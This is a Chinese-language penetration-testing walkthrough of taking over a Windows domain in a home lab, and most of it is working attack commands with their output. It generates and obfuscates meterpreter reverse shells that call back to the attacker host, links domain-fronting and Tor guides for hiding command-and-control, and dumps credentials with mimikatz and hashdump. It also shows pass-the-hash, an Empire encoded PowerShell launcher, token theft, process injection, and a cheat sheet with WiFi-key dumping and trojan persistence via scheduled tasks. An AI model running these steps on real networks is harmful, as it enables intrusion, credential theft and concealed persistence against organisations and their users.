# **内网渗透：域渗透**

```
	攻击机：kali linux  IP:192.168.1.100

​	主域：windows_Server2012_R2  IP:192.168.1.106   

​	从域：windows_Server2012_R2  IP:192.168.1.104 

​	成员：windows7  IP:192.168.1.107
```

​	简单搭建的域环境，在真实的环境中要比这复杂的多，大公司很可能管理上百上千台机器。

### 假设场景：

​	假设通过WIFI、Web和任何方式拿到了一台域成员主机的控制权，接下来横爬整个内网，拿下最高权限。如果不拿下最高权限说明你不是一名合格的渗透人员。都知道的ms17直接MSF打没加补丁的windows7。

### 注入poweshell:

github作为仓库便于利用。

msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.1.100 LPORT=443 -f psh > shell.ps1

 Unicorn 混淆 payload： <https://github.com/trustedsec/unicorn>

```python
python unicorn.py windows/meterpreter/reverse_https 192.168.1.100 443
#生成的 payload : powershell_attack.txt
# msfconsole -r /opt/unicorn/unicorn.rc

```

### 域名前置 隐藏C2服务：

<https://2rot13.wordpress.com/2018/01/03/domain-fronting-with-meterpreter/>

<https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/>

利用阿里巴巴CDN <https://medium.com/@vysec.private/alibaba-cdn-domain-fronting-1c0754fa0142>

搭建Tor服务，利用<https://www.tor2web.org/>  使表网能访问到达隐藏的目的

### 信息收集：

关于终端乱码设置方式：终端->设定字符编码->GBK编码格式；

```ruby
meterpreter > run post/windows/gather/checkvm #查看是否是虚拟机

[*] Checking if ZHAJI-PC is a Virtual Machine .....
[+] This is a VMware Virtual Machine
```

获取安装软件信息

```ruby
meterpreter > run post/windows/gather/enum_applications 

[*] Enumerating applications installed on ZHAJI-PC

Installed Applications
======================

 Name                                                             Version
 ----                                                             -------
 Google Chrome                                                    73.0.3683.86
 Google Update Helper                                             1.3.34.7
 Microsoft .NET Framework 4 Client Profile                        4.0.30319
 Microsoft .NET Framework 4 Client Profile                        4.0.30319
 Microsoft .NET Framework 4 Client Profile CHS Language Pack      4.0.30319
 Microsoft .NET Framework 4 Client Profile 简体中文语言包                4.0.30319
 Microsoft Visual C++ 2017 Redistributable (x64) - 14.12.25810    14.12.25810.0
 Microsoft Visual C++ 2017 Redistributable (x86) - 14.12.25810    14.12.25810.0
 Microsoft Visual C++ 2017 x64 Additional Runtime - 14.12.25810   14.12.25810
 Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.12.25810      14.12.25810
 Microsoft Visual C++ 2017 x86 Additional Runtime - 14.12.25810   14.12.25810
 Microsoft Visual C++ 2017 x86 Minimum Runtime - 14.12.25810      14.12.25810
 VMware Tools                                                     10.3.2.9925305

```

获取IE缓存信息

```ruby
meterpreter > run post/windows/gather/enum_ie 

[*] IE Version: 8.0.7601.17514
[*] Retrieving history.....
	File: C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Windows\History\History.IE5\index.dat
[*] Retrieving cookies.....
	File: C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\Cookies\index.dat
[*] Looping through history to find autocomplete data....
[-] No autocomplete entries found in registry
[*] Looking in the Credential Store for HTTP Authentication Creds...
```

获取Chrome缓存信息

```ruby
meterpreter > run post/windows/gather/enum_chrome

[*] Impersonating token: 2016
[-] Post failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
[-] Call stack:
[-]   /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb:43:in `getsid'
[-]   /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb:51:in `is_system?'
[-]   /usr/share/metasploit-framework/lib/msf/core/post/windows/priv.rb:109:in `is_system?'
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:298:in `run'

```

查找域控

```ruby
meterpreter > run post/windows/gather/enum_domain

[+] FOUND Domain: zhaji
[+] FOUND Domain Controller: WIN-84BQ15AGU7U (IP: 192.168.1.106)
```

枚举所有登录用户

```ruby
meterpreter > run post/windows/gather/enum_logged_on_users 

[*] Running against session 2

Current Logged Users
====================

 SID                                             User
 ---                                             ----
 S-1-5-21-3228731416-2981283892-2168871728-1000  zhaji-PC\zhaji


[+] Results saved in: /root/.msf4/loot/20190405145350_default_192.168.1.107_host.users.activ_078242.txt

Recently Logged Users
=====================

 SID                                             Profile Path
 ---                                             ------------
 S-1-5-18                                        %systemroot%\system32\config\systemprofile
 S-1-5-19                                        C:\Windows\ServiceProfiles\LocalService
 S-1-5-20                                        C:\Windows\ServiceProfiles\NetworkService
 S-1-5-21-3228731416-2981283892-2168871728-1000  C:\Users\zhaji

```

收集所有组策略

```ruby
[*] Checking for group policy history objects...
[-] Error accessing C:\ProgramData\Microsoft\Group Policy\History : stdapi_fs_ls: Operation failed: The system cannot find the path specified.
[*] Checking for SYSVOL locally...
[-] Error accessing C:\Windows\SYSVOL\sysvol : stdapi_fs_ls: Operation failed: The system cannot find the path specified.
[*] Enumerating Domains on the Network...
[*] Retrieved Domain(s) ZHAJI from network
[*] Enumerating domain information from the local registry...
[*] Retrieved Domain(s) ZHAJI from registry
[*] Retrieved DC WIN-84BQ15AGU7U.ZHAJI.COM from registry
[*] Enumerating DCs for ZHAJI on the network...
[+] DC Found: WIN-84BQ15AGU7U
[+] DC Found: WIN-OGS41UCH3J0
[*] Searching for Policy Share on WIN-84BQ15AGU7U...
[-] Error accessing \\WIN-84BQ15AGU7U\SYSVOL : stdapi_fs_ls: Operation failed: 1326
[*] Searching for Policy Share on WIN-OGS41UCH3J0...
[-] Error accessing \\WIN-OGS41UCH3J0\SYSVOL : stdapi_fs_ls: Operation failed: 1326
[*] Searching for Policy Share on WIN-84BQ15AGU7U.ZHAJI.COM...
[-] Error accessing \\WIN-84BQ15AGU7U.ZHAJI.COM\SYSVOL : stdapi_fs_ls: Operation failed: 1326
[*] Searching for Group Policy XML Files...

```

查找所有远程桌面会话 (这就是我们想要的东西)

```ruby
meterpreter > run post/windows/gather/enum_termserv 

[*] Doing enumeration for S-1-5-21-3228731416-2981283892-2168871728-1000
[+] Systems connected to:
[+] --> 192.168.1.106
[+] Server list and user hints:
[+] 192.168.1.106 is connected to as ZHAJI\DTzhaji
```

嗅探此段位

```ruby
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.1-254

[*] Running module against ZHAJI-PC
[*] ARP Scanning 192.168.1.1-254
[+] 	IP: 192.168.1.1 MAC  (UNKNOWN)
[+] 	IP: 192.168.1.100 MAC  (UNKNOWN)
[+] 	IP: 192.168.1.104 MAC  (VMware, Inc.)
[+] 	IP: 192.168.1.107 MAC  (VMware, Inc.)
[+] 	IP: 192.168.1.102 MAC  (UNKNOWN)
[+] 	IP: 192.168.1.106 MAC  (VMware, Inc.)
[+] 	IP: 192.168.1.105 MAC  (Intel Corporate)
[+] 	IP: 192.168.1.103 MAC  (UNKNOWN)
[+] 	IP: 192.168.1.101 MAC  (UNKNOWN)

```

### DOS 命令查询：

转载来自：<https://www.t00ls.net/articles-39285.html>

```bash
1.域常用操作命令：

net group /domain                       //获得所有域用户组列表

net group qq_group /domain              //显示域中qq_group组的成员

net group qq_group /del /domain         //删除域中qq_group组

net group qq_group qq /del /domain      //删除域内qq_group 群组中的成员QQ

net group qq_group /add /domain         //增加域中的群组

net group "domain admins" /domain       //获得域管理员列表

net group "enterprise admins" /domain    //获得企业管理员列表

net localgroup administrators /domain   //获取域内置administrators组用（enterprise admins、domain admins）

net group "domain controllers" /domain   //获得域控制器列表

net group "domain computers" /domain    //获得所有域成员计算机列表

net user /domain                       //获得所有域用户列表

net user someuser /domain              //获得指定账户someuser的详细信息

net accounts /domain               //获得域密码策略设置，密码长短，错误锁定等信息

nei view /domain                  //查询有几个域, 查询域列表

net view /domain:testdomain       //查看 testdomain域中的计算机列表

nltest /domain_trusts             //获取域信任信息

net user domain-admin /domain     //查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息

net config Workstation         //查询机器属于哪个域

net time /domian               //查询主域服务器的时间

echo %logonserver%              //查看登陆到这台服务器的计算机名

net time  \\192.168.1.1         //查询远程共享主机192.168.1.1的时间

net use \\IP\ipc$ password /user:username@domain     //ipc$域内连接

net  view  \\dc2.backlion.com         //查看域控共享情况

dir \\dc2.backlion.com\SYSVOL /s /a > sysvol.txt  //列出sysvol日志记录

xcopy \\dc2.backlion.com\sysvol.txt sysvol.txt  /i  /e  /c//远程拷贝到本地sysvol日志

net user  /domain  bk bk123                 //修改域内用户密码，需要管理员权限

net  localgroup  administartors   SEZKL\backlion  /add     //将SEZKL域中的用户backlion添加到administrators组中

mstsc /admin                 //远程桌面登录到console会话解决hash无法抓出问题

gpupdate/force                  //更新域策略

psexec  \\192.168.1.3  -u administrator  -p  bk1234 -c  gsecdump.exe  -u

  //从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来

gsecdump  -a        //获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值

tasklist /S ip /U domain\username /P /V    //查看远程计算机进程列


2.基本内网渗透命令：

ipconfig/all    //查看IP地址

ipconfig /release  //释放地址

ipconfig /renew 重新获取Ip地址

whoami    //查询账号所属权限

whoami/all  //查看sid值

systeminfo  //查询系统以及补丁信息

tasklist /svc   //查看进程

taskkill /im 进程名称(cmd) //结束进程

taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)

wmic qfe  get hotfixid    //查看已安装过得补丁，这个很实用

wmic qfe list full /format:htable > hotfixes.htm  //详细的补丁安装

wmic  qfe      //查询补丁信息以及微软提供的下载地址

ping hostname(主机名）   //显示该机器名的IP

net start   //查看当前运行的服务

net user      //查看本地组的用户

net localhroup administrators   //查看本机管理员组有哪些用户

net use      //查看会话

net session     //查看当前会话

net share       //查看SMB指向的路径[即共享]

wmic share get name,path   //查看SMB指向的路径

wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置

net use \\IP\ipc$  password  /user:username      //建立IPC会话（工作组模式）

net use  z:  \\192.168.1.1      //建立映射到本机Z盘

net time \\172.16.16.2        //查询共享主机的是

at \\172.16.16.2 13:50 c:\windows\2009.exe      //在共享主机上执行

netstat  -ano      //查看开放的端口

netstat -an | find “3389”   //找到3389端口

net accounts      //查看本地密码策略

nbtstat –A ip      //netbiso查询

net view      //查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来

echo %PROCESSOR_ARCHITECTURE%        //查看系统是32还是64位  

set                              //查看系统环境设置变量

net start                     //查看当前运行的服务

wmic service list brief             //查看进程服务

wmic process list brief         //查看进程

wmic startup list brief       //查看启动程序信息

wmic product list brief           //查看安装程序和版本信息（漏洞利用线索）

wmic startup list full         //识别开机启动的程序

wmic process where(description="mysqld.exe") >>mysql.log  //获取软件安装路径


for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan showprofiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %jkey=clear

//一键获取wifi密码


if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell)

//查看是否支持posershell


qwinsta                       //查看登录情况


schtasks.exe  /Create /RU"SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "c:/muma.ex    e" /ED 2017/4/7  //添加计划任务



set KB2829361=MS13-046&set KB2830290=MS13-046&setKB2667440=MS12-020&set KB2667402=MS12-020&set KB3124280=MS16-016&setKB3077657=MS15-077&set KB3045171=MS15-051&setKB2592799=MS11-080&set KB952004=MS09-012 PR&set KB956572=MS09-012 巴西烤肉&set KB970483=MS09-020 iis6&set KB2124261=MS10-065 ii7&setKB2271195=MS10-065 ii7&systeminfo>a.txt&(for %i in (KB952004 KB956572KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt|@find /i "%i"||@echo %%i% Not Installed!)&del /f/q /a a.txt

//windows未打补丁情况


REG query HKCU  /v "pwd" /s  //获取保存到注册表中的密码


3.内网网络结常用命令：

tracert IP    //路由跟踪

route print    //打印路由表

arp -a          //列出本网段内所有活跃的IP地址

arp -s （ip + mac）//绑定mac与ip地址

arp -d （ip + mac） //解绑mac与ip地址

nbtscan -r 192.168.16.0/24      //通过小工具nbtscan扫描整个网络

netsh firewall show config     //查看防火墙策略

netsh firewall show state     //查看防火墙策略

for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i"ttl"   //批量扫描内网存活主机


windows自带端口转发：

netsh interface ipv6 install  //首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！）

netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22connectaddress=1.1.1.1 connectport=22  //将本机22到1.1.1.1的22

netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=8.8.8.8 connectport=22

netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=www.baidu.com connectport=22

netsh interface portproxy show all // 查看转发配置

netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0listenport=22 //删除配置

netsh firewall set portopening protocol=tcp port=22 name=Forwardmode=enable scope=all profile=all  //添加防火墙规则，允许连接22：


4.敏感数据和目录：

dir /b/s config.*              //查看所在目录所有config.为前缀的文件

findstr /si password *.xml *.ini *.txt    //查看后缀名文件中含有password关键字的文件

findstr /si login *.xml *.ini *.txt    //查看后缀名文件中含有login关键字的文件

copy con 创建命令：

copy con  ftp.bat     //创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功

copy con  test.vbs    //创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功


5.dsquery的AD查询工具：

dsquery user domainroot -limit 65535 && net user /domain    //列出该域内所有用户名

dsquery server -domain super.com | dsget server -dnsname -site    //搜索域内所有域控制器并显示他们的DNS主机名和站点名称

dsquery contact    //寻找目录中的联系人

dsquery subnet     //列出该域内网段划分

query user             //查询那些用户在线

dsquery group && net group /domain     //列出该域内分组

dsquery ou                             //列出该域内组织单位

dsquery server && net time /domain      //列出该域内域控制器

dsquery site -o rdn                 //搜索域中所有站点的名称

dsquery group dc=super,dc=com |more   //搜索在DC=SUPER,DC=COM 域中的所有组

psloggedon.exe                        //查询那台主机和用户登录到该主机上

netsess.exe   //192.168.1.115         //远程主机上无需管理员权限,查询到主机名和用户

reg query "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT" //获取最近mstsc登录的记录


6.DOS常用快捷命令

mspaint　　画图工具

calc　　计算器

notepad　　记事本

taskmgr　　任务管理器

osk　　打开屏幕键盘

gpedit.msc　　组策略

services.msc　　本地服务

compmgmt.msc　　计算机管理

devmgmt.msc　　设备管理器

winver　　查看系统版本

magnify　　放大镜实用程序

eventvwr　　事件查看器

Regedit　　打开注册表

resmon　　资源监视器

WMIC BIOS get releasedate　　查看电脑生产日期

mstsc -f　　远程连接（可以全屏）
```

### 创建跳板夸网段漫游内网：

为了方便工具的嗅探扫描，创建代理；

查询：

```ruby
meterpreter > run get_local_subnets 

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
Local subnet: 192.168.1.0/255.255.255.0

```

autoroute添加路由 

PS: 同网段，没必要设置

```ruby
meterpreter > run autoroute -s 192.168.1.0 225.225.225.0

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.168.1.0/255.255.255.0...
[+] Added route to 192.168.1.0/255.255.255.0 via 192.168.1.107
[*] Use the -p option to list all active routes
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.1.0        255.255.255.0      Session 2

```

socks4a 代理

```ruby
meterpreter > background 
[*] Backgrounding session 2...
msf5 post(windows/gather/checkvm) > use auxiliary/server/socks4a 
msf5 auxiliary(server/socks4a) > set srvhost 127.0.0.1
srvhost => 127.0.0.1
msf5 auxiliary(server/socks4a) > run

```

编辑vi /etc/proxychains.conf

添加socks4

socks4 127.0.0.1 1080 #根据你自己设置的端口进行填写

启用proxychains nmap 扫描

### 挖掘账号密码：

```ruby
meterpreter > load mimikatz #使用mimikatz抓取密码
Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to 'load kiwi' instead?
Success.
meterpreter > wdigest #获取wdigest密码
[+] Running as SYSTEM
[*] Retrieving wdigest credentials
wdigest credentials
===================

AuthID    Package    Domain        User           Password #没设置密码抓到的是空
------    -------    ------        ----           --------
0;116694  NTLM       zhaji-PC      zhaji          
0;116663  NTLM       zhaji-PC      zhaji          
0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  
0;50018   NTLM                                    
0;996     Negotiate  ZHAJI         ZHAJI-PC$      SV@sw3UFb_"q\S5^@dhss"/QfOpYHmI/[b0e[R8IM_@JC1j\@A2 ):,qD,VxGT6d"E_+AQIkVUC]Ve_]Z/7W=SOMSF]CW$.L<$7=Qnk\R eg(5)"B*^OnK3A
0;999     Negotiate  ZHAJI         ZHAJI-PC$      SV@sw3UFb_"q\S5^@dhss"/QfOpYHmI/[b0e[R8IM_@JC1j\@A2 ):,qD,VxGT6d"E_+AQIkVUC]Ve_]Z/7W=SOMSF]CW$.L<$7=Qnk\R eg(5)"B*^OnK3A

meterpreter > mimikatz_command -f samdump::hashes #mimikatz原始命令
Ordinateur : zhaji-PC.zhaji.com
BootKey    : 9f237e1b××××××××cbf84b

Rid  : 500
User : Administrator
LM   : 
NTLM : 31d6cf××××××××d7e0c089c0

Rid  : 501
User : Guest
LM   : 
NTLM : 

Rid  : 1000
User : zhaji
LM   : 
NTLM : 3×××××××××××××××c089c0
meterpreter > mimikatz_command -f sekurlsa::searchPasswords
[0] { ZHAJI-PC$ ; ZHAJI ; SV@sw3UFb_"q\S5^@dhss"/QfOpYHmI/[b0e[R8IM_@JC1j\@A2 ):,qD,VxGT6d"E_+AQIkVUC]Ve_]Z/7W=SOMSF]CW$.L<$7=Qnk\R eg(5)"B*^OnK3A }
[1] { zhaji-pc$ ; ZHAJI.COM ; SV@sw3UFb_"q\S5^@dhss"/QfOpYHmI/[b0e[R8IM_@JC1j\@A2 ):,qD,VxGT6d"E_+AQIkVUC]Ve_]Z/7W=SOMSF]CW$.L<$7=Qnk\R eg(5)"B*^OnK3A }
[2] { ZHAJI-PC$ ; ZHAJI ; SV@sw3UFb_"q\S5^@dhss"/QfOpYHmI/[b0e[R8IM_@JC1j\@A2 ):,qD,VxGT6d"E_+AQIkVUC]Ve_]Z/7W=SOMSF]CW$.L<$7=Qnk\R eg(5)"B*^OnK3A }
[3] { zhaji-pc$ ; ZHAJI.COM ; SV@sw3UFb_"q\S5^@dhss"/QfOpYHmI/[b0e[R8IM_@JC1j\@A2 ):,qD,VxGT6d"E_+AQIkVUC]Ve_]Z/7W=SOMSF]CW$.L<$7=Qnk\R eg(5)"B*^OnK3A }
meterpreter > hashdump 
Administrator:500:aad3b43×××××××××××××××435b51404ee:31d6×××××××××××××××7e0c089c0:::
Guest:501:aad3b435b5×××××××××××××××51404ee:31d×××××××××××××××e0c089c0:::
zhaji:1000:aad3b4×××××××××××××××35b51404ee:31d6cf×××××××××××××××××××××××e0c089c0:::
meterpreter > 
#隐身并在系统上显示令牌
```

```ruby
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
zhaji-PC\zhaji

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter > list_tokens -g
```

### 横向移动：

查找域共享资源

```ruby
meterpreter > shell 
Process 1740 created.
Channel 1 created.
Microsoft Windows [版本 6.1.7601]
版权所有 (c) 2009 Microsoft Corporation。保留所有权利。

C:\Windows\system32>net view
net view
服务器名称            注解

-------------------------------------------------------------------------------
\\WIN-84BQ15AGU7U                                                              
\\WIN-OGS41UCH3J0                                                              
\\ZHAJI-PC #本地                                                                     
命令成功完成。
```

进一步查看

```ruby
C:\Windows\system32>net view \\WIN-84BQ15AGU7U
net view \\WIN-84BQ15AGU7U
在 \\WIN-84BQ15AGU7U 的共享资源



共享名    类型  使用为  注释                 

-------------------------------------------------------------------------------
NETLOGON  Disk          Logon server share   
SYSVOL    Disk          Logon server share   
命令成功完成。


C:\Windows\system32>net view \\WIN-OGS41UCH3J0
net view \\WIN-OGS41UCH3J0
在 \\WIN-OGS41UCH3J0 的共享资源



共享名    类型  使用为  注释                 

-------------------------------------------------------------------------------
NETLOGON  Disk          Logon server share   
SYSVOL    Disk          Logon server share   
命令成功完成。

```

IP寻找

```ruby
C:\Windows\system32>nslookup
nslookup
默认服务器:  UnKnown
Address:  192.168.1.106

> WIN-84BQ15AGU7U
服务器:  UnKnown
Address:  192.168.1.106

名称:    WIN-84BQ15AGU7U.zhaji.com
Address:  192.168.1.106

> WIN-OGS41UCH3J0
服务器:  UnKnown
Address:  192.168.1.106

名称:    WIN-OGS41UCH3J0.zhaji.com
Address:  192.168.1.104

```

传递哈希值（失败）

```ruby
meterpreter > run post/windows/gather/hashdump 

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 9f237e1be3f8ff9dcce5d20880cbf84b...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
zhaji:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

msf5 exploit(windows/smb/ms17_010_eternalblue) > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > set LHOST 192.168.1.100
LHOST => 192.168.1.100
msf5 exploit(windows/smb/psexec) > set lport 5555
lport => 5555
msf5 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
SMBPass => aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

```

###### MSF5  --  Empire  联动：

PS: 以下是在windows server2016R2 

empire 可以直接设置域名接收shell，在C2服务结合前置域来伪装隐藏等效果更加！msf 也可设置域名接收shell！

```ruby

(Empire: listeners) > uselistener http
(Empire: listeners/http) > info
(Empire: listeners/http) > set Host 192.168.116.6
(Empire: listeners/http) > set Port 8080
(Empire: listeners/http) > set Name hk
(Empire: listeners/http) > info
(Empire: listeners/http) > execute
[*] Starting listener 'hk'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: Do not use the development server in a production environment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!
(Empire: listeners/http) > listeners

[*] Active listeners:

  Name              Module          Host                                 Delay/Jitter   KillDate
  ----              ------          ----                                 ------------   --------
  hk                http            http://192.168.116.6:8080            5/0.0  
(Empire: listeners) > launcher powershell hk
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAGEAYgBMAGUALgBQAFMAVgBlAFIAUwBpAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAcw...................
    

meterpreter > shell 
Process 1496 created.
Channel 5 created.
Microsoft Windows [版本 6.1.7601]
版权所有 (c) 2009 Microsoft Corporation。保留所有权利。

C:\Windows\system32>powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAGEAYgBMAGUALgBQAFMAVgBlAFIAUwBpAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAcwBzAGUAbQBCAGwAWQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAu
```

```
(Empire: listeners) > [*] Sending POWERSHELL stager (stage 1) to 192.168.116.6
[*] New agent SPYZHC3B checked in
[+] Initial agent SPYZHC3B from 192.168.116.6 now active (Slack)
[*] Sending agent (stage 2) to SPYZHC3B at 192.168.116.6

(Empire: listeners) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------
 SPYZHC3B ps 172.16.186.142  BLABLA-PC         *ZHAJI\SYSTEM           powershell         2508   5/0.0    2019-04-15 16:47:07

(Empire: agents) > interact SPYZHC3B

```

密码抓取: （只要是有域权限在这台机器上，或者任何人使用这台机器登录其他机器都可抓取到密码）

```ruby
(Empire: SPYZHC3B) > mimikatz
[*] Tasked SPYZHC3B to run TASK_CMD_JOB
[*] Agent SPYZHC3B tasked with task ID 15
[*] Tasked agent SPYZHC3B to run module powershell/credentials/mimikatz/logonpasswords
(Empire: SPYZHC3B) > [*] Agent SPYZHC3B returned results.
Job started: 4DEMPN
[*] Valid results returned by 192.168.116.6
[*] Agent SPYZHC3B returned results.
Hostname: blabla-PC.zhaji.com / authority\system-authority\system

  .#####.   mimikatz 2.1.1 (x64) built on Nov 12 2017 15:32:00
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 894827 (00000000:000da76b)
Session           : Interactive from 2
User Name         : Administrator
Domain            : ZHAJI
Logon Server      : AD2
Logon Time        : 2019/4/15 19:40:04
SID               : S-1-5-21-990960896-2357513707-4042444594-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : ZHAJI
	 * NTLM     : 17b32f7076be3ce58f0aec4cd978f04c
	 * SHA1     : 399059f2abfa438c8d1d25f04788a7504295512e
    .....省略

```

用户枚举：

```ruby
(Empire: powershell/situational_awareness/network/powerview/get_user) > set UserName Administrator #针对那个用户

(Empire: powershell/situational_awareness/network/powerview/get_user) > execute

（信息太多省略。。。。）

```

窃取令牌：

```ruby
(Empire: SPYZHC3B) > ps
                  
ProcessName                 PID Arch            UserName        MemUsage                                      
powershell                 2436 x64             ZHAJI\Administr 0.84 MB        
                                                ator                           
powershell                 2508 x64             NT AUTHORITY\SY 6.80 MB        
                                                STEM                           
powershell                 2716 x64             blabla-PC\blabl 55.90 MB       
                                                a                              
taskhost                   2968 x64             ZHAJI\Administr 1.23 MB        
                                                ator                           
conhost                    3012 x64             blabla-PC\blabl 1.93 MB        
                                                a                              
winlogon                   3028 x64             NT AUTHORITY\SY 0.39 MB        
                                                STEM                           
taskhost                   3220 x64             ZHAJI\Administr 4.61 MB        


(Empire: SPYZHC3B) > steal_token 2436
```

移动到域控：

```ruby
Empire: 4VU9RLBX) > usemodule management/psinject 
(Empire: powershell/management/psinject) > info
(Empire: powershell/management/psinject) > set ProcId 2436
(Empire: powershell/management/psinject) > set Listener hk
(Empire: powershell/management/psinject) > execute

查看是否有访问权：

(Empire: 4VU9RLBX) > shell dir \\AD1\c$  
[*] Tasked 4VU9RLBX to run TASK_SHELL
[*] Agent 4VU9RLBX tasked with task ID 22
(Empire: 4VU9RLBX) > [*] Agent 4VU9RLBX returned results.
目录: \\AD1\c$

```

python 工具： <https://github.com/SecureAuthCorp/impacket/tree/master/examples>



### 总结：

​	一次比较失败的域渗透，正在努力学习完善！！！
